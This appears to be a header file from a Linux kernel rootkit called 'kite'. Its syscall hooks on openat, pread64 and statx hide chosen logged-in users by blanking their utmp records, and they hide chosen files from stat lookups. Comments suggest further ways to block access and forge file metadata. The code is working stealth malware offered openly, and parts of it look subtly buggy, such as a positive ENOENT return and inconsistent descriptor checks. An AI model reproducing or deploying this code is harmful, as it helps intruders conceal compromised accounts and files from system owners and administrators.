#ifndef FILE_HACKS_KITE
    #define FILE_HACKS_KITE
    #include "utmp.h" //utmp.h is not defined in the kernel so we define it on our own, contains the utmp struct to handle logged in users
    #include "kite_hook.h"
    #include "linked_list.h"


static int utmpfd = -1;

/* !**can block file access by filtering in openat**
   !**for more complex file filtering/hiding can be used to filter by file descriptors in statx**

   openat is a systemcall used to open files,
   it returns the file descriptor that is opened for the process requested it,
   it allows relative access to files relative to the directory it was called from,
   it uses dirfd which is the file descriptor of the current dir, if the path is aboslute,
   it ignores the dirfd. can create the file if not exists.
   the hook was created to check if the utmp file(users logged in) is opened,
   if it was, we save the file descriptor to later check in pread64 hook to filter the users.
*/
#ifdef PTREGS_SYSCALL_STUB
static asmlinkage int hack_openat(struct pt_regs *regs){
    char *kern_filename;
    char *filename = (char *)regs->si;
    char *utmp_path = "/var/run/utmp";
    int utmp_path_len = 14;

    kern_filename = kzalloc(NAME_MAX, GFP_KERNEL);

    if(kern_filename == NULL){
        return orig_openat(regs);
    }

    if(copy_from_user(kern_filename, filename, NAME_MAX)){
        kfree(kern_filename);
        return orig_openat(regs);
    }

    if(memcmp(kern_filename, utmp_path, utmp_path_len) == 0){
        utmpfd = orig_openat(regs);
        kfree(kern_filename);
        return utmpfd;
    }

    kfree(kern_filename);
    return orig_openat(regs);
}

/* hook for pread64, check if utmp was opened, if it was,
   check if the current read from file contains one of the users that were requested to be hidden,
    if it was then copy to the original buffer an empty one to then skip the user record
*/
static asmlinkage ssize_t hack_pread64(struct pt_regs *regs){
    unsigned int fd = regs->di; // the file descriptor that is being read from
    char *buf = (char *)regs->si; // the buffer contains the utmp struct from the file
    size_t count = regs->dx; // size of the buffer
    if(fd == utmpfd && utmpfd != 0 && utmpfd != 1 && utmpfd != 2){ // check in case STDOUT, STDIN, STDERR were not opened
        char *read_buff;
        struct utmp *utmp_s;
        ssize_t ret;
        int err;


        read_buff = kzalloc(count, GFP_KERNEL);
        if(read_buff == NULL){
            return orig_pread64(regs);
        }
        
        ret = orig_pread64(regs);
        err = copy_from_user(read_buff, buf, count);
        if(err != 0){
            kfree(read_buff);
            return ret;
        }

        utmp_s = (struct utmp *)read_buff;
        if(find_node(&users_to_hide, utmp_s->ut_user) == 0){
            size_t i = 0;
            while(i < count){
                read_buff[i] = 0x0;
                i++;
            }

            err = copy_to_user(buf, read_buff, count);
            kfree(read_buff);
            return ret;
        }
    }

    return orig_pread64(regs);
}

/* when listing a file directly, the system uses statx() syscall.(note stat syscall)
   statx returns information about a file, that is in the buffer in the address of pathname(rsi),
   if its relative then its in relation to dirfd(rdi), which is the folder file descriptor,
   flags(rdx) is used to change the behaveior of the function and mask(r10),
   is used to tell the kernel which fields the caller is interested in,
   the function then stores the stats collected at the struct statx which its address pointed by statxbuf(r8).
   ! can also use this function to return false stats on files/dirs by changing the statx struct pointed to by statxbuf
*/
static asmlinkage int hack_statx(struct pt_regs *regs){
    char * token;
    char *temp_filename = kmalloc(NAME_MAX + 1, GFP_KERNEL);
    if(temp_filename == NULL){
        return orig_statx(regs);
    }
    if(copy_from_user(temp_filename, (char *)regs->si, NAME_MAX) != 0){
        kfree(temp_filename);
        return orig_statx(regs);
    }
    while((token = strsep(&temp_filename, "/"))) { // loop through the string to extract all other tokens
        if(find_node(&files_to_hide, token) == 0){
            kfree(temp_filename);
            return ENOENT;
        }
    }

    kfree(temp_filename);
    return orig_statx(regs);
}
#else
static asmlinkage int hack_openat(int dfd, const char *filename, int flags, umode_t mode){
    char *kern_filename;
    char *utmp_path = "/var/run/utmp";
    int utmp_path_len = 14;

    kern_filename = kzalloc(NAME_MAX, GFP_KERNEL);

    if(kern_filename == NULL){
        return orig_openat(dfd, filename, flags, mode);
    }

    if(copy_from_user(kern_filename, filename, NAME_MAX) != 0){
        kfree(kern_filename);
        return orig_openat(dfd, filename, flags, mode);
    }

    if(memcmp(kern_filename, utmp_path, utmp_path_len) == 0){
        utmpfd = orig_openat(dfd, filename, flags, mode);
        kfree(kern_filename);
        return utmpfd;
    }

    kfree(kern_filename);
    return orig_openat(dfd, filename, flags, mode);
}


static asmlinkage ssize_t hack_pread64(unsigned int fd, char *buf, size_t count, loff_t pos){
    if(fd == utmpfd && utmpfd != 1 && utmpfd != 2 && utmpfd != 3){
        char *read_buff;
        struct utmp *utmp_s;
        ssize_t ret;
        int err;


        read_buff = kzalloc(count, GFP_KERNEL);
        if(read_buff == NULL){
            return orig_pread64(fd, buf, count, pos);
        }
        
        ret = orig_pread64(fd, buf, count, pos);
        err = copy_from_user(read_buff, buf, count);
        if(err != 0){
            kfree(read_buff);
            return ret;
        }

        utmp_s = (struct utmp *)read_buff;
        if(find_node(&users_to_hide, utmp_s->ut_user) == 0){
            size_t i = 0;
            while(i < count){
                read_buff[i] = 0x0;
                i++;
            }

            err = copy_to_user(buf, read_buff, count);
            kfree(read_buff);
            return ret;
        }
    }
    return orig_pread64(fd, buf, count, pos);
}


static asmlinkage int hack_statx(int dirfd, const char *restrict pathname, int flags, unsigned int mask, struct statx *restrict statxbuf){
    char * token;
    char *temp_filename = kmalloc(NAME_MAX + 1, GFP_KERNEL);
    if(temp_filename == NULL){
        return orig_statx(dirfd, pathname, flags, mask, statxbuf);
    }

    if(copy_from_user(temp_filename, pathname, NAME_MAX) != 0){
        kfree(temp_filename);
        return orig_statx(dirfd, pathname, flags, mask, statxbuf);
    }

    while((token = strsep(&temp_filename, "/"))) { // loop through the string to extract each dir/filename in path by spliting /, strsep like strtok()
        if(find_node(&files_to_hide, token) == 0){
            kfree(temp_filename);
            return ENOENT;
        }
    }

    kfree(temp_filename);
    return orig_statx(dirfd, pathname, flags, mask, statxbuf);
}
#endif
#endif